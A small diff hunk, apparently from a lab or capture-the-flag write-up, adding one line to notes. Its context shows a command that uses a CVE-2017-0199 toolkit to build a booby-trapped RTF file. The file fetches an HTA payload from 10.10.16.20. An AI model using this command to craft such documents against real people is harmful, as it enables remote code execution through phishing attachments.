@@ -302,3 +302,4 @@ Will regenerate the CVE file
 python cve-2017-0199_toolkit.py -M gen -w singh.rtf -u 'http://10.10.16.20/singh.hta' -t RTF -x 0
 ```
 
+I don't know but will generate the file with the author name.
